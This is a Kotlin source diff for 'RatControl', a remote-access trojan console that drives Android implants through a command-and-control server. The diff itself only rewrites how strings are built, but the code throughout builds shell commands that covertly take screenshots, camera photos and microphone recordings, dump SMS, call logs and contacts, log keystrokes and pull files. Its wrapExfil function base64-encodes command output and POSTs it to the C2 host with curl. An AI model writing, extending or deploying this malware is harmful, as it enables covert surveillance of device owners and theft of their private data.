@@ -4,6 +4,12 @@ import org.json.JSONObject
 import java.text.SimpleDateFormat
 import java.util.Locale
 
+// Character codes as strings — keeps all shell building in RatControl free
+// of quote/backslash escapes in source (see wrapExfil parity test).
+private val RAT_SQ = 39.toChar().toString() // single quote
+private val RAT_DQ = 34.toChar().toString() // double quote
+private val RAT_BS = 92.toChar().toString() // backslash
+
 /**
  * Remote-access fleet console engine — drives implants beaconing to the
  * on-device C2 (C2State TASKQ) with the same task protocol as the Python
@@ -57,17 +63,19 @@ object RatControl {
     fun cmdLocate(): String =
         "curl -s -m 15 https://ip-api.com/json/ 2>/dev/null | head -c 1024"
 
-    fun cmdFileList(path: String): String = "ls -la ${shQuote(path)} 2>&1"
+    fun cmdFileList(path: String): String = "ls -la " + shQuote(path) + " 2>&1"
 
     fun cmdFileGet(path: String): String =
-        "base64 ${shQuote(path)} 2>/dev/null || cat ${shQuote(path)} 2>/dev/null"
+        "base64 " + shQuote(path) + " 2>/dev/null || cat " + shQuote(path) + " 2>/dev/null"
 
-    fun cmdScreenshot(): String =
-        "P=/data/local/tmp/.qshot.png; screencap -p \$P 2>/dev/null && " +
-            "base64 \$P 2>/dev/null; rm -f \$P"
+    fun cmdScreenshot(): String {
+        val sh = dollar()
+        return "P=/data/local/tmp/.qshot.png; screencap -p " + sh + "P 2>/dev/null && " +
+            "base64 " + sh + "P 2>/dev/null; rm -f " + sh + "P"
+    }
 
     fun cmdCamera(which: Int = 0): String =
-        "termux-camera-photo -c $which " +
+        "termux-camera-photo -c " + which + " " +
             "/data/data/com.termux/files/home/.qsnap.jpg 2>/dev/null && " +
             "base64 /data/data/com.termux/files/home/.qsnap.jpg 2>/dev/null; " +
             "rm -f /data/data/com.termux/files/home/.qsnap.jpg"
@@ -75,16 +83,16 @@ object RatControl {
     fun cmdMic(seconds: Int = 10): String {
         val secs = seconds.coerceIn(1, 300)
         return "termux-microphone-record -d -f " +
-            "/data/data/com.termux/files/home/.qmic.wav -l $secs 2>/dev/null; " +
+            "/data/data/com.termux/files/home/.qmic.wav -l " + secs + " 2>/dev/null; " +
             "sleep 1; base64 /data/data/com.termux/files/home/.qmic.wav 2>/dev/null; " +
             "rm -f /data/data/com.termux/files/home/.qmic.wav"
     }
 
     fun cmdSms(limit: Int = 50): String =
-        "termux-sms-list -l ${limit.coerceIn(1, 500)} 2>/dev/null"
+        "termux-sms-list -l " + limit.coerceIn(1, 500) + " 2>/dev/null"
 
     fun cmdCalls(limit: Int = 50): String =
-        "termux-call-log -l ${limit.coerceIn(1, 500)} 2>/dev/null"
+        "termux-call-log -l " + limit.coerceIn(1, 500) + " 2>/dev/null"
 
     fun cmdContacts(): String = "termux-contact-list 2>/dev/null"
 
@@ -93,27 +101,38 @@ object RatControl {
 
     fun cmdKeylogAndroid(seconds: Int = 30): String {
         val secs = seconds.coerceIn(5, 600)
-        return "timeout $secs getevent -l 2>/dev/null | head -c 65536; " +
+        return "timeout " + secs + " getevent -l 2>/dev/null | head -c 65536; " +
             "echo '[keylog window closed]'"
     }
 
     /** Shell-quote one argument (single-quote style, same as shlex.quote). */
     fun shQuote(s: String): String =
-        "'" + s.replace("'", "'\"'\"'") + "'"
+        RAT_SQ + s.replace(RAT_SQ, RAT_SQ + RAT_DQ + RAT_SQ + RAT_DQ + RAT_SQ) + RAT_SQ
+
+    /** A literal dollar sign for building shell strings (avoids template escapes). */
+    private fun dollar(): String = "${'$'}"
 
     /**
      * Wrap [cmd] so output is POSTed to <c2Url>/r as a data drop.
-     * Byte-compatible with quantum.rat.commands.wrap_exfil.
+     * Byte-compatible with quantum.rat.commands.wrap_exfil — the parity test
+     * locks the exact shell text (see RatControlTest.wrapExfilParityWithPython).
      */
     fun wrapExfil(cmd: String, c2Url: String, host: String): String {
         if (cmd.isBlank()) throw IllegalArgumentException("refusing to wrap an empty command")
         val c2 = c2Url.trimEnd('/')
-        val safeHost = host.replace("\"", "")
-        return "T=\${TMPDIR:-/tmp}/.qo\$\$; (" + cmd.trim() + ") >\$T 2>&1; " +
-            "D=\$(base64 -w0 <\$T 2>/dev/null || base64 <\$T 2>/dev/null | tr -d '\\n'); " +
+        val safeHost = host.replace(RAT_DQ, "")
+        val sh = dollar()
+        // Shell text, byte-identical to quantum.rat.commands.wrap_exfil:
+        // T=${TMPDIR:-/tmp}/.qo$$; (CMD) >$T 2>&1; D=$(base64 ...); curl ... -d JSON ...; rm -f $T
+        return "T=" + sh + "{TMPDIR:-/tmp}/.qo" + sh + sh +
+            "; (" + cmd.trim() + ") >" + sh + "T 2>&1; " +
+            "D=" + sh + "(base64 -w0 <" + sh + "T 2>/dev/null || base64 <" + sh +
+            "T 2>/dev/null | tr -d " + RAT_SQ + RAT_BS + "n" + RAT_SQ + "); " +
             "curl -s -m 25 -X POST " + c2 + "/r " +
-            "-H 'Content-Type: application/json' " +
-            "-d \"{\\\"host\\\":\\\"\" + safeHost + "\\\",\\\"data\\\":\\\"\$D\\\"}\" >/dev/null 2>&1; rm -f \$T"
+            "-H " + RAT_SQ + "Content-Type: application/json" + RAT_SQ + " " +
+            "-d " + RAT_DQ + "{" + RAT_BS + RAT_DQ + "host" + RAT_BS + RAT_DQ + ":" + RAT_BS + RAT_DQ +
+            safeHost + RAT_BS + RAT_DQ + "," + RAT_BS + RAT_DQ + "data" + RAT_BS + RAT_DQ + ":" + sh +
+            "D" + RAT_BS + RAT_DQ + "}" + RAT_DQ + " >/dev/null 2>&1; rm -f " + sh + "T"
     }
 
     /** Build the TASKQ task object for C2State.setTask. */
@@ -137,8 +156,8 @@ object RatControl {
             "applist" -> cmdApplist()
             "keylog" -> cmdKeylogAndroid(arg.toIntOrNull() ?: 30)
             else -> throw IllegalArgumentException(
-                "unknown capability $capabilityId " +
-                    "(known: ${CAPABILITIES.joinToString(",") { it.id }})",
+                "unknown capability " + capabilityId +
+                    " (known: " + CAPABILITIES.joinToString(",") { it.id } + ")",
             )
         }
         return JSONObject()
@@ -158,7 +177,7 @@ object RatControl {
             val country = o.optString("country", "?")
             val isp = o.optString("isp", "?")
             val q = o.optString("query", "?")
-            "$city, $region, $country · $q · $isp (IP-based, coarse)"
+            city + ", " + region + ", " + country + " - " + q + " - " + isp + " (IP-based, coarse)"
         } catch (e: Exception) {
             null
         }
